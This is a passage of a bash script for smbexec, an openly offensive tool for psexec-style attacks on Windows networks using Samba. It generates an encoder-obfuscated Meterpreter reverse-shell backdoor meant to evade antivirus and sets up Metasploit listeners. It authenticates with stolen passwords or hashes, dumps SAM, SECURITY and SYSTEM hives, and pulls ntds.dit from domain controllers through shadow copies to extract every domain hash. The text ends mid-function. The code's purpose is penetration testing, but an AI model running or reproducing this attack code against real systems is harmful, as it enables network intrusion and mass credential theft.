#!/bin/bash

# Written because we got sick of Metasploit PSExec getting popped
# Special thanks to Carnal0wnage who's blog inspired us to go this route
# http://carnal0wnage.attackresearch.com/2012/01/psexec-fail-upload-and-exec-instead.html
#
# Script super-dopified by @al14s - Thanks for taking it to the next level!!
#
#Rapid psexec style attack using linux samba tools
#Copyright (C) 2012  Eric Milam (Brav0Hax) & Martin Bos (Purehate)
#
#This program is free software: you can redistribute it and/or modify
#it under the terms of the GNU General Public License as published by
#the Free Software Foundation, either version 3 of the License, or
#any later version.
#
#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.
#
#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.e
#
# Last update - 08/12/2012 v1.1.0
#############################################################################################
# Check to see if X is running
if [ -z $(pidof X) ] && [ -z $(pidof Xorg) ]; then
	isxrunning=
else
	isxrunning=1
fi

# Uncomment the following line to launch Metasploit in a screen session instead of an xterm window.
# unset isxrunning

# Uncomment the following line to launch Metasploit in an xterm window if you've tunneled X over SSH.
#isxrunning=1

trap f_ragequit 2

# Find the files and set the path values based on machine architecture
smbexecpath=$(locate -l 1 smbexeclient | sed 's,/*[^/]\+/*$,,')

# Check if its Fedora or Red Hat, because they feel the need to be "special"
if [ -e /etc/redhat-release ]; then
	isrhfedora=1
fi

logfldr=$PWD/$(date +%F-%H%M)-smbexec
mkdir $logfldr

if [ -z $isxrunning ]; then
	echo -e "\n\e[1;31m[-] X Windows not detected, your Metasploit session will be launched in screen\e[0m\n"
	sleep 5
fi

# Workaround to get rid of annoying samba error for patched smbclient
if [ ! -e /usr/local/samba/lib/smb.conf ]; then
	mkdir -p /usr/local/samba/lib/
	cp $smbexecpath/patches/smb.conf /usr/local/samba/lib/smb.conf
fi

f_ragequit(){ 
echo -e "\n\n\e[1;31m[-] Rage-quitting....\e[0m"
sleep 3
#check if we've got shells in play... if so, we clean those up first...
if [[ $dirty == 1 ]];then
	echo -e "\n\e[1;31m[!] We have shells in play we need to cleanup those systems....\e[0m"
	sleep 2
	f_cleanup
fi

if [[ -z $(ls $logfldr) ]];then rm -rf $logfldr; fi
rm -rf /tmp/smbexec/
clear
exit

}

f_vanish(){
	clear
	f_banner

	echo -e "\e[1;33mLet's get your payload setup...\e[0m\n"

	#"************************************************************"
	#"    Fully Undetectable Metasploit Payload generaor Beta     "
	#"        Original Concept and Script by Astr0baby            "
	#"     Stable Version of Script is Edited by Vanish3r         "
	#"    Video Tutorial by Vanish3r - www.securitylabs.in        "
	#" Powered by TheHackerNews.com and securitylabs.in           "
	#"************************************************************"
	# Major script modifications by Brav0Hax and al14s

	f_revhttp(){ 
		payload=windows/meterpreter/reverse_http
		f_setup_payload 
	}

	f_revhttps(){ 
		payload=windows/meterpreter/reverse_https
		f_setup_payload 
	}

	f_revtcp(){ 
		payload=windows/meterpreter/reverse_tcp
		f_setup_payload 
	}

	f_revtcpdns(){ 
		payload=windows/meterpreter/reverse_tcp_dns
		f_setup_payload 
	}

	f_custompayload(){
		clear
		f_banner
		while [ -z $payload ]; do
			read -p " Please enter your Windows payload (double-tab to list PWD) : " payload
		done
		f_setup_payload
	}


	f_setup_payload(){
		clear
		f_banner
		lhost=
		
		echo -e "\n\e[1;33mYou have chosen the following payload - $payload\e[0m"

		# Gather info to build standard payload		
		if [[ "$paychoice" == "4" ]]; then
			while [ -z $lhost ]; do read -p " Enter DNS Host Name ex: www.attacker.com : " lhost; done
		else
				
		#List interfaces w/ their IPs		
			echo -e "\nActive Interfaces:\n"
			ifconfig | awk '/Link encap:Eth/ {print;getline;print}' | sed '{ N; s/\n/ /; s/Link en.*.HWaddr//g; s/ Bcast.*//g; s/UP.*.:1//g; s/inet addr/IP/g; }' | sed '$a\\n'
			while [ -z $lhost ]; do read -p " Enter Local Host (LHOST) IP address : " lhost
			    if [[ ! $lhost =~ ^(25[0-4]{1}|2[0-4]{1}[0-9]{1}|[1]{0,1}[1-9]{0,1}[1-9]{1}|100|[1-9]{1}0){1}\.((25[0-4]|2[0-4][0-9]|[1]{0,1}[1-9]{0,1}[0-9]{1}|100){1}\.){2}(25[0-4]{1}|2[0-4]{1}[0-9]{1}|[1]{0,1}[1-9]{0,1}[1-9]{1}|100|[1-9]{1}0){1}$ ]]; then
			        lhost=
			    fi
			done
		fi
		while [ -z $port ]; do read -p " What Port Number (LPORT) are we gonna listen to? : " port; done

		f_build_payload
	}

	f_build_payload(){
		if [ "$isrhfedora" == "1" ];then
			mingw=$(find /usr/bin | grep mingw32-gcc$)
		else
			mingw=$(find /usr/bin | grep msvc-gcc$|grep 86)
		fi
		
		echo -e "\n\e[1;33mBuilding your payload please be patient...\e[0m"

		# Create backdoor.exe - puts the file together in order -al14s
		p=
		enumber=$((RANDOM%20+3))
		seed=$((RANDOM%10000+1))
		if [[ "$paychoice" -le "2" ]]; then p=" SessionCommunicationTimeout=600"; fi
		echo -e '#include <stdio.h>\nunsigned char ufs[]=' > $logfldr/backdoor.c
		for (( i=1; i<=10000;i++ )) do echo $RANDOM $i; done | sort -k1| cut -d " " -f2| head -$seed | sed 's/$/"/' | sed 's/^/"/' | sed '$a;' >> $logfldr/backdoor.c
		msfpayload "$payload" LHOST="$lhost" LPORT="$port"$p EXITFUNC=thread R | msfencode -e x86/shikata_ga_nai -c $enumber -t raw | msfencode -e x86/jmp_call_additive -c $enumber -t raw | msfencode -e x86/call4_dword_xor -c $enumber -t raw | msfencode -e x86/shikata_ga_nai -c $enumber | sed -e 's/+/ /g' | sed -e 's/buf = /unsigned char micro[]=/g' | sed '$a;' >> $logfldr/backdoor.c
		echo -e "int main(void) { ((void (*)())micro)();}\nunsigned char tap[]=" >> $logfldr/backdoor.c
		for (( i=1; i<=999999;i++ )) do echo $RANDOM $i; done | sort -k1| cut -d " " -f2| head -$seed | sed 's/$/"/' | sed 's/^/"/'| sed '$a;' >> $logfldr/backdoor.c
		echo -e "\n\e[1;33mCompiling executable...\e[0m"
		$mingw -Wall $logfldr/backdoor.c -o $logfldr/backdoor.exe > /dev/null 2>&1
		rm $logfldr/backdoor.c

		echo -e "\n\e[1;33mGetting file's SHA1SUM...\e[0m"
		sha1sum $logfldr/backdoor.exe > $logfldr/sha1-backdoor.hash
		strip --strip-debug $logfldr/backdoor.exe

		echo -e "\n\e[1;33mPayload successfully compiled and ready for use...\e[0m"

		f_resource_file
	}

	f_resource_file(){
		rc=$logfldr/metasetup.rc
		echo "spool $logfldr/msfoutput-$DATE.txt" > $rc
		echo "use exploit/multi/handler" >> $rc
		echo "set payload $payload" >> $rc
		echo "set LHOST $lhost" >> $rc
		echo "set LPORT $port" >> $rc
		if [ "$paychoice" -le "2" ]; then
			echo "set SessionCommunicationTimeout 600" >> $rc
		fi
		echo "set ExitOnSession false" >> $rc
		echo "set InitialAutoRunScript migrate -f" >> $rc
		echo "exploit -j -z" >> $rc
		if [ "$mainchoice" == "5" ]; then
			echo -e "\n\e[1;33mPayload and Resource file successfully created...\e[0m"
			sleep 3
			f_mainmenu
		else
			echo -e "\n\e[1;33mResource file successfully created, launching Metasploit...\e[0m"

			if [ -z $isxrunning ]; then
				echo -e "\n\e[1;33mLaunching Metasploit in a screen session, once its loaded hit Ctrl-a then a and then d to detach and continue attack setup\e[0m"
				echo -e "\n\e[1;33mPlease press enter to continue."
				read -p " "
				screen -mS Metasploit -t msfconsole bash -c "msfconsole -r $rc"
			else
				xterm -geometry -0+0 -hold -e msfconsole -r $rc &
				sleep 10
			fi
		fi
	}

	# Function for supplying your own payload & rc file
	f_payloadrc(){
		valid=
		while [[ $valid != 1 ]]; do
            echo -ne "\n Please provide the full path to your payload file (ex: /root/Desktop/backdoor.exe) (double-tab to see PWD) : "
			read -e -p " " LPATH
			if [ -e $LPATH ]; then
				valid=1
			else
				echo "Not a valid file/path."
			fi
		done

		read -p " Do you have a Metasploit listener running already? [y/N] : " listener
		listener=$(echo ${listener} | tr 'A-Z' 'a-z')

		if [ "$listener" = "n" ] || [ -z "$listener" ]; then
			valid=
			while [[ $valid != 1 ]]; do
				echo -ne "\n Please provide the full path to your Metasploit rc file (ex: /root/Desktop/metasploit.rc) (double-tab to see PWD) :"
				read -e -p " " rcpath
				if [ -e $rcpath ] && [[ $(echo "$rcpath" | awk '{ print substr( $0, length($0)-1, length($0) ) }') == "rc" ]]; then
					valid=1
				else
					echo "Not a valid .rc file/path."
				fi
			done
			if [ ! -z $isxrunning ]; then
				xterm -geometry -0+0 -hold -e msfconsole -r $rcpath & > /dev/null 2>&1
				sleep 10
			elif [ -z $isxrunning ]; then
				echo -e "\n\e[1;33mLaunching Metasploit in a screen session, once its loaded hit Ctrl-a then d to detach and continue attack setup\e[0m"
				echo -en "\n\e[1;33mPlease press enter to continue...\e[0m"
				read -p " "
				screen -mS Metasploit -t msfconsole bash -c "msfconsole -r $rcpath"
			fi
		fi
	}

	#Menu Items
	echo "Select Payload"
	echo "  1. windows/meterpreter/reverse_http"
	echo "  2. windows/meterpreter/reverse_https"
	echo "  3. windows/meterpreter/reverse_tcp"
	echo "  4. windows/meterpreter/reverse_tcp_dns"
	echo "  5. Other Windows Payload"
	echo "  6. I already have a payload and Metasploit rc file"
	echo "  7. Back (Main Menu)"

	echo -en "\n Choice :"
	read -p " " paychoice

	case "$paychoice" in
		1) f_revhttp ;;
		2) f_revhttps ;;
		3) f_revtcp ;;
		4) f_revtcpdns ;;
		5) f_custompayload ;;
		6) f_payloadrc ;;
		7) f_mainmenu ;;
		*) exit ;;
	esac

	f_getinfo
}


f_banner(){
	clear
	echo "************************************************************"
	echo -e "		      \e[1;36msmbexec - v1.1.0\e[0m       "
	echo "	A rapid psexec style attack with samba tools              "
	echo "      Original Concept and Script by Brav0Hax & Purehate    "
	echo "              Codename - Diamond in the Rough	          "
	echo -e "             Gonna pha-q up - \e[1;35mPurpleTeam\e[0m Smash!"
	echo "************************************************************"
	echo
}

#Function to grab local hashes and domain cached creds
f_hashgrab(){
creddumpath=$(locate -l 1 -b "\pwdump.py" | sed 's,/*[^/]\+/*$,,')

if [ ! -e "$logfldr"/hashes ]; then
	mkdir $logfldr/hashes
fi

    f_banner
    f_smbauth	
    p=
    if [[ -e "$logfldr/host.lst.$(echo $range | cut -d"/" -f1)" ]]; then p="[$logfldr/host.lst.$(echo $range | cut -d"/" -f1)]"; fi
    read -e -p " Target IP or host list $p: " tf
    if [ -z $tf ]; then tf="$logfldr/host.lst.$(echo $range | cut -d"/" -f1)"; fi

    if [[ $tf =~ ^(25[0-4]{1}|2[0-4]{1}[0-9]{1}|[1]{0,1}[1-9]{0,1}[1-9]{1}|100|[1-9]{1}0){1}\.((25[0-4]|2[0-4][0-9]|[1]{0,1}[1-9]{0,1}[0-9]{1}|100){1}\.){2}(25[0-4]{1}|2[0-4]{1}[0-9]{1}|[1]{0,1}[1-9]{0,1}[1-9]{1}|100|[1-9]{1}0){1}$ ]]; then
	    echo $tf > /tmp/smbexec/rhost.txt
	    RHOSTS=/tmp/smbexec/rhost.txt
    elif [[ -e $tf ]]; then 
	    RHOSTS=$tf
    else
	    echo -en "   Invalid IP or file does not exist.\n"
	    f_insideprompt
    fi

    for i in $(cat $RHOSTS); do
	# Check to see if login is valid to the system before it attempts anything else
	$smbexecpath/smbexeclient //$i/C$ -A /tmp/smbexec/smbexec.auth -c "showconnect" >& /tmp/smbexec/connects.tmp

	# Check to see what type of error we got so we can tell the user
	f_smbauthinfo

	if [ -s /tmp/smbexec/success.chk ] && [ -z "$badshare" ]; then
		echo -e "\n\e[1;32m[+] Authentication to $i successful...\e[0m"
	elif [ -s /tmp/smbexec/success.chk ] && [ ! -z "$badshare" ]; then
		echo -e "\n\e[1;33m[*] Authentication to $i was successful, but the share doesn't exist\e[0m"
	elif [ ! -z "$logonfail" ]; then
		echo -e "\n\e[1;31m[-] Authentication to $i failed\e[0m"
	elif [ ! -z "$connrefused" ]; then
		echo -e "\n\e[1;31m[-] Connection to $i was refused\e[0m"
	elif [ ! -z "$unreachable" ]; then
		echo -e "\n\e[1;31m[-] There is no host assigned to IP address $i \e[0m"
	else
		echo -e "\n\e[1;33m[*] I'm not sure what happened, supplying output...\e[0m"
		cat /tmp/smbexec/connects.tmp | egrep -i 'error|fail'
	fi

	# Get successful IP addy for cleanup later
	ConnCheck=$(cat /tmp/smbexec/connects.tmp | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' | sort -u)

	# If no successful connection was made above this portion is skipped
	if [ -s /tmp/smbexec/success.chk ] && [ -z "$badshare" ]; then
		echo $ConnCheck >> /tmp/smbexec/hosts.loot.tmp # Place successful connection IPs into a holding file
		mkdir $logfldr/hashes/$i
		# Get the registry keys
		$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C reg.exe save HKLM\SAM C:\Windows\Temp\sam && reg.exe save HKLM\SECURITY C:\Windows\Temp\sec && reg.exe save HKLM\SYSTEM C:\Windows\Temp\sys" &> /dev/null
		$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/C$ -c "get \\WINDOWS\\Temp\\sam $logfldr/hashes/$i/sam" &> /dev/null
		$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/C$ -c "get \\WINDOWS\\Temp\\sec $logfldr/hashes/$i/sec" &> /dev/null
		$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/C$ -c "get \\WINDOWS\\Temp\\sys $logfldr/hashes/$i/sys" &> /dev/null
		#cleanup the host
		$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C DEL C:\Windows\Temp\sam && DEL C:\Windows\Temp\sec && DEL C:\Windows\Temp\sys" &> /dev/null
	
		#Get the hashes out of the reg keys
		if [ -e $logfldr/hashes/$i/sam ] && [ -e $logfldr/hashes/$i/sec ] && [ -e $logfldr/hashes/$i/sys ]; then
			$creddumpath/pwdump.py $logfldr/hashes/$i/sys $logfldr/hashes/$i/sam > $logfldr/hashes/$i/localhashes.lst
			$creddumpath/cachedump.py $logfldr/hashes/$i/sys $logfldr/hashes/$i/sec > $logfldr/hashes/$i/dcchashes.lst
			echo -en "\n\e[1;32m[+] Hashes from $i have been dumped...\e[0m"
			sleep 2
		    else
			echo -en "\n\e[1;31m[!] Something happened and I couldn't get the registry keys from $i...\e[0m"
			sleep 2
		fi
	fi

	#Unset the variables because we're in a for-loop
	unset logonfail
	unset connrefused
	unset badshare
	unset unreachable
done

f_freshstart
f_mainmenu

}

f_dchashgrab(){

if [ ! -e "$logfldr"/hashes ]; then
	mkdir $logfldr/hashes
fi

f_banner
f_smbauth
f_finddcs

read -e -p " Domain Controller IP address: " tf
#if [ -z $tf ]; then tf="$logfldr/host.lst.$(echo $range | cut -d"/" -f1)"; fi

if [[ $tf =~ ^(25[0-4]{1}|2[0-4]{1}[0-9]{1}|[1]{0,1}[1-9]{0,1}[1-9]{1}|100|[1-9]{1}0){1}\.((25[0-4]|2[0-4][0-9]|[1]{0,1}[1-9]{0,1}[0-9]{1}|100){1}\.){2}(25[0-4]{1}|2[0-4]{1}[0-9]{1}|[1]{0,1}[1-9]{0,1}[1-9]{1}|100|[1-9]{1}0){1}$ ]]; then
	echo $tf > /tmp/smbexec/rhost.txt
	RHOSTS=/tmp/smbexec/rhost.txt
elif [[ -e $tf ]]; then
	RHOSTS=$tf
else
	echo -en "   Invalid IP or file does not exist.\n"
	f_insideprompt
fi

for i in $(cat $RHOSTS); do
	mkdir $logfldr/hashes/DC
	# Create a Volume Shadow Copy
	echo -e "\n\e[1;33mAttempting to create a Volume Shadow Copy for the Domain Controller specified...\e[0m"
	$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C vssadmin create shadow /for=c:" &> /tmp/smbexec/vssdc.out
	vscpath=$(cat /tmp/smbexec/vssdc.out | grep "Volume Name"|cut -d " " -f9)
	if [ -z "$vscpath" ]; then
		echo -e "\t\e[1;31m[!] Could not create a Volume Shadow Copy...\e[0m"
		sleep 5
		f_freshstart
		f_mainmenu
	else
		echo -e "\t\e[1;32m[+] Volume Shadow Copy Successfully Created...\e[0m"
		sleep 2
	fi
	echo -e "\n\e[1;33mAttempting to copy the ntds.dit file from the Volume Shadow Copy...\e[0m"
	sleep 2
	$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C copy $vscpath\WINDOWS\NTDS\ntds.dit C:\\Windows\\Temp\\ntds.dit && reg.exe save HKLM\SYSTEM C:\\Windows\\Temp\\sys" &> /dev/null
	$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/C$ -c "get \\WINDOWS\\Temp\\ntds.dit $logfldr/hashes/DC/ntds.dit" &> /dev/null
	$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/C$ -c "get \\WINDOWS\\Temp\\sys $logfldr/hashes/DC/sys" &> /dev/null
	if [ ! -e $logfldr/hashes/DC/ntds.dit ] && [ ! -e $logfldr/hashes/DC/sys ]; then
		echo -e "\t\e[1;31m[!] Could not grab ntds.dit & sys files from the Domain Controller...\e[0m"
		sleep 5
		f_freshstart
		f_mainmenu
	else
		echo -e "\t\e[1;32m[+] We have ntds.dit & sys files...let's get some hashes\e[0m"
		sleep 2
	fi
	#cleanup the host
	$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C DEL C:\Windows\Temp\sys && DEL C:\Windows\Temp\ntds.dit" &> /dev/null
done

f_esedbexport
f_dsusers
f_freshstart
f_mainmenu

}

f_finddcs(){
dig SRV _ldap._tcp.pdc._msdcs.$SMBDomain.com |egrep -v '(;|;;)' |grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' > /tmp/smbexec/pdc.txt
dig SRV _ldap._tcp.dc._msdcs.$SMBDomain.com |egrep -v '(;|;;)' |grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' > /tmp/smbexec/dcs.txt

if [ -s /tmp/smbexec/pdc.txt ]; then
	echo -e "\nPrimary Domain Controller\n========================="
	cat /tmp/smbexec/pdc.txt
fi

if [ -s /tmp/smbexec/dcs.txt ]; then
	echo -e "\nAll Domain Controllers\n======================"
	cat /tmp/smbexec/dcs.txt
	echo
fi

}

f_esedbexport(){
echo -e "\n\e[1;33mExtracting data and link tables from the ntds.dit file...\e[0m"
sleep 2
eseexportpath=$(locate -l 1 -b "\esedbexport"| sed 's,/*[^/]\+/*$,,')
$eseexportpath/esedbexport -l /tmp/smbexec/esedbexport.log -t /tmp/smbexec/ntds.dit $logfldr/hashes/DC/ntds.dit
datatable=$(ls /tmp/smbexec/ntds.dit.export/ | grep datatable)
linktable=$(ls /tmp/smbexec/ntds.dit.export/ | grep link_table)
}

f_dsusers(){
echo -e "\n\e[1;33mExtracting hashes, please standby...\e[0m"
sleep 2
dsuserspath=$(locate -l 1 -b "\dsusers.py"| sed 's,/*[^/]\+/*$,,')
python $dsuserspath/dsusers.py /tmp/smbexec/ntds.dit.export/$datatable /tmp/smbexec/ntds.dit.export/$linktable --passwordhashes $logfldr/hashes/DController/sys --passwordhistory $logfldr/hashes/DC/sys --certificates --suplcreds $logfldr/hashes/DC/sys --membership > $logfldr/hashes/DC/ntds.output
$smbexecpath/ntdspwdump.py $logfldr/hashes/DC/ntds.output > $logfldr/hashes/DC/dc-hashes.lst

if [ -s $logfldr/hashes/DC/dc-hashes.lst ]; then
	echo -e "\n\e[1;32m[+] Success, looks like we got what we came for...\e[0m"
	sleep 5
else
	echo -e "\n\e[1;31m[!] The file is empty, looks like something didn't work right...\e[0m"
	sleep 5
	f_freshstart
	f_mainmenu
fi

}

#Function to build host list
f_hosts(){
	f_banner

	range=
	while [ -z "$range" ]; do read -p " Enter your target network range (nmap format) : " range; f_validaterange; done

	echo -e "\n\e[1;33mPerforming an nmap scan to identify live devices with ports 139 & 445 open.\n\n\t -This may take a bit.-\e[0m"

	nmap -sS -P0 -n -p139,445 --open "$range" -oG $logfldr/host.gnmap &> /dev/null
	cat $logfldr/host.gnmap | awk '{print $2}'|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' | sort -u > $logfldr/host.lst.$(echo $range | cut -d"/" -f1)

	if [ -s $logfldr/host.lst.$(echo $range | cut -d"/" -f1) ]; then
		echo -e "\n\e[1;33mHosts found:\e[0m"
		cat $logfldr/host.lst.$(echo $range | cut -d"/" -f1)
		rm $logfldr/host.gnmap
		echo -en "\n\e[1;33mYour host file is located at $logfldr/host.lst.$(echo $range | cut -d"/" -f1)\n\n\tHit Enter to Return to Main Menu.\e[0m"
		read -p " "
	else
		echo -en "\n\e[1;33mI'm sorry but no hosts were identified with port 139 or 445 open.\e[0m"
		rm $logfldr/host.gnmap
		rm $logfldr/host.lst.$(echo $range | cut -d"/" -f1)
	fi
	f_freshstart
	f_mainmenu
}

f_validaterange(){
    # added nmap format validation - use of subnets (ex. 192.168.0.0/24), stars (ex. 192.168.*.*), and split ranges (ex. 192.168.1.1-10,14) now accepted.
    if [ -z $(echo "$range" | grep -E '^((25[0-4]{1}|2[0-4]{1}[0-9]{1}|[1]{0,1}[1-9]{0,1}[1-9]{1}|100|[1-9]{1}0){1}([-,](25[0-4]{1}|2[0-4]{1}[0-9]{1}|[1]{0,1}[1-9]{0,1}[1-9]{1}|100|[1-9]{1}0){1}){0,}|\*)\.(((25[0-4]{1}|2[0-4]{1}[0-9]{1}|[1]{0,1}[1-9]{0,1}[0-9]{1}|100){1}([-,](25[0-4]{1}|2[0-4]{1}[0-9]{1}|[1]{0,1}[1-9]{0,1}[0-9]{1}|100){1}){0,}|\*)\.){2}((25[0-4]{1}|2[0-4]{1}[0-9]{1}|[1]{0,1}[1-9]{0,1}[0-9]{1}|100){1}([-,](25[0-4]{1}|2[0-4]{1}[0-9]{1}|[1]{0,1}[1-9]{0,1}[0-9]{1}|100){1}){0,}|\*|([0]{1}\/(8|9|[1-2]{1}[0-9]{1}|30|31|32){1})){1}$' | grep -v -E '([-][0-9]{1,3}[-])|(([,-].*[/]|[/].*[,-])|([*].*[/]|[/].*[*]))') ]; then
        range=
    else
        range=$(echo ${range})
    fi
}

#Function to emuerate shares - thx c0ncealed, great idea!
f_enumshares(){

	f_banner

	p=
	if [[ -e "$logfldr/host.lst.$(echo $range | cut -d"/" -f1)" ]]; then p="[$logfldr/host.lst.$(echo $range | cut -d"/" -f1)]"; fi
	read -e -p " Target IP or host list $p: " tf
	if [ -z $tf ]; then tf="$logfldr/host.lst.$(echo $range | cut -d"/" -f1)"; fi

	if [[ $tf =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
		echo $tf > /tmp/smbexec/sharerhost.txt
		SHARERHOSTS=/tmp/smbexec/sharerhost.txt
	elif [[ -e $tf ]]; then 
		SHARERHOSTS=$tf
	elif [[ -z $tf ]]; then 
		f_enumshares
	else
		echo -en "\n Invalid IP or file does not exist.\n\n Hit enter to return to Main Menu."
		read -p " "
		f_mainmenu
	fi

	# Call the smbauth functions
	f_smbauth

	touch /tmp/smbexec/enum.shares
	for i in $(cat "$SHARERHOSTS"); do
		echo -e "\n***************" | tee -a /tmp/smbexec/enum.shares
		echo $i | tee -a /tmp/smbexec/enum.shares
		echo "***************" | tee -a /tmp/smbexec/enum.shares

		#not at all sure why $smbexecpath/smbexeclient wants to run the folder...
		cd $smbexecpath
		./smbexeclient -L $i -A /tmp/smbexec/smbexec.auth >& /tmp/smbexec/connects.tmp
		cd - &> /dev/null
	
		f_smbauthinfo
		#What we are going to show the user
		if [ ! -z "$logonfail" ]; then
			echo -e "\e[1;31m[-] Authentication to $i failed\e[0m" | tee -a /tmp/smbexec/enum.shares
		elif [ ! -z "$connrefused" ]; then
			echo -e "\e[1;31m[-] Connection to $i was refused\e[0m" | tee -a /tmp/smbexec/enum.shares
		elif [ ! -z "$unreachable" ]; then
			echo -e "\e[1;31m[-] There is no host assigned to IP address $i \e[0m" | tee -a /tmp/smbexec/enum.shares
		else
			cat /tmp/smbexec/connects.tmp | awk '/Sharename/,/failed/'| egrep -v 'session|lame'| tee -a /tmp/smbexec/enum.shares
		fi
	done

	# Move the file
	mv /tmp/smbexec/enum.shares $logfldr/$SMBUser.host.shares.$DATE

	# We'll provide a statistical analysis of the shares file if it's there...
	if [ -z $(cat $logfldr/*.host.shares.* | grep 'No such file' )  ]; then
		echo -e "\nTop 10 shares in enum file: \n\n    count\tshare\n ----------------------"
		cat $logfldr/*.host.shares.*| grep -E 'Disk' | cut -d" " -f1 | sed -e 's/^ *//' | sort | uniq -c | sort -nr | head -10
	fi

	echo -e "\n\e[1;33mThe list of host shares can be found at $logfldr/$SMBUser.host.shares.$DATE\e[0m\n\n  \e[1;33mHit enter to return to Main Menu.\e[0m"
	read -p " "

	f_freshstart
	f_mainmenu
}


f_smbauth(){
	SMBUser= #Since the prog is a loop make sure we clear this out
	while [ -z $SMBUser ]; do read -r -p " Please provide the username to authenticate as : " SMBUser; done
	SMBPass= #Since the prog is a loop make sure we clear this out
	while [ -z $SMBPass ]; do read -p " Please provide the password or hash (<LM>:<NTLM>) for the specified username : " SMBPass; done

	# Hashes are 65 characters long, this compares input to see if its a password or a hash
	SMBHASH= #Since the prog is a loop make sure we clear this out
	if [ "$(echo $SMBPass| wc -m)" -ge "65" ]; then 
		export SMBHASH=$SMBPass # This is required when using a hash value
	fi

	# If a domain account is being used, ask for the domain name if not included in SMBUser
	if [ "$mainchoice" == "2" ]; then 
		if [[ -n $(echo $SMBUser | awk -F\\ '{printf("%s", $2)}') ]]; then
			SMBDomain=$(echo $SMBUser | awk -F\\ '{print $1}')
			SMBUser=$(echo $SMBUser | awk -F\\ '{print $2}')
		else
			while [ -z $SMBDomain ]; do read -p " Please provide the Domain for the user account specified : " SMBDomain; done
		fi
	elif [ "$mainchoice" == "4" ]; then # Check for domain for host share list option
		read -p " Please provide the Domain for the user account specified [localhost] : " SMBDomain
		if [ -z $SMBDomain ]; then SMBDomain=.;	fi
	elif [ "$mainchoice" == "6" ]; then # Check for domain for host share list option
		read -p " Please provide the Domain for the user account specified [localhost] : " SMBDomain
		if [ -z $SMBDomain ]; then SMBDomain=.;	fi
	else
		SMBDomain=. #equivalent to localhost, thx Mubix!
	fi

	echo "username=$SMBUser" > /tmp/smbexec/smbexec.auth
	echo "password=$SMBPass" >> /tmp/smbexec/smbexec.auth
	echo "domain=$SMBDomain" >> /tmp/smbexec/smbexec.auth
}

f_smbauthinfo(){
	cat /tmp/smbexec/connects.tmp | grep -i "Domain=" > /tmp/smbexec/success.chk
	logonfail=$(cat /tmp/smbexec/connects.tmp | grep -i "NT_STATUS_LOGON_FAILURE")
	connrefused=$(cat /tmp/smbexec/connects.tmp | grep -i "NT_STATUS_CONNECTION_REFUSED")
	badshare=$(cat /tmp/smbexec/connects.tmp | egrep -i 'NT_STATUS_BAD_NETWORK_NAME|NT_STATUS_OBJECT_PATH_NOT_FOUND')
	unreachable=$(cat /tmp/smbexec/connects.tmp | grep -i "NT_STATUS_HOST_UNREACHABLE")
}

#Function to gain the basic info
f_getinfo(){
	clear
	f_banner

	echo -e "\e[1;33mLet's get some info to finalize the attack...\e[0m"

	if [ -z "$LPATH" ]; then LPATH=$logfldr/backdoor.exe; fi
    
	read -p " Please enter the name of a writable share on the victim. [C$] : " SMBShare
	if [ -z "$SMBShare" ]; then SMBShare="C$"; fi

	# Check to see if the admin share is being used
	 if [ "$SMBShare" == "ADMIN$" ]; then
		isadmin=1
		prepath="\\Windows" # Need to add a prepath for the smbwinexe command to work properly
	 fi

	# Check for a share with $ that is not C$
	share=$(echo $SMBShare | grep '\$' | grep -v 'ADMIN\$')
	 if [ ! -z "$share" ] && [ "$share" != "C$" ]; then
	   sharecheck=$(echo $share | cut -d "$" -f1) # Trim the $ off for the winexe share value
	   oddshare="$sharecheck:"
	 fi

	# Check for a 1 letter share without a $
	onelettershare=$(echo $SMBShare | egrep -i '\<[e-z]\>')
	 if [ ! -z "$onelettershare" ]; then
	  SMBShare="$onelettershare"
	  oddshare="$SMBShare:"
	 fi

	echo " Please provide the path to place the exe on the remote host."
	echo -n " Hit enter to place in root of share or enter path (ex: \\\\Temp): "
	read -p "" RPATH
	sharecheck=$(echo $SMBShare | cut -d "$" -f1)
	 if [ -z "$RPATH" ] && [ -z "$isadmin" ] && [ -z "$oddshare" ]; then
	   superoddshare=1
	 fi
	 if [ -z "$RPATH" ] && [ "$SMBShare" == "C$" ]; then
	   cemptyrpath=1
	 fi

	f_smbauth	
	
	p=
	if [[ -e "$logfldr/host.lst.$(echo $range | cut -d"/" -f1)" ]]; then p="[$logfldr/host.lst.$(echo $range | cut -d"/" -f1)]"; fi
	read -e -p " Target IP or host list $p: " tf
	if [ -z $tf ]; then tf="$logfldr/host.lst.$(echo $range | cut -d"/" -f1)"; fi

	if [[ $tf =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
		echo $tf > /tmp/smbexec/rhost.txt
		RHOSTS=/tmp/smbexec/rhost.txt
	elif [[ -e $tf ]]; then 
		RHOSTS=$tf
	else
		echo -en "   Invalid IP or file does not exist.\n"
		f_insideprompt
	fi
	f_getsome
}

# The name says it all...get your popcorn ready...
f_getsome(){
	cat /dev/urandom| tr -dc '0-9a-zA-Z'|head -c 8 > /tmp/smbexec/filename.rnd #create a random filename
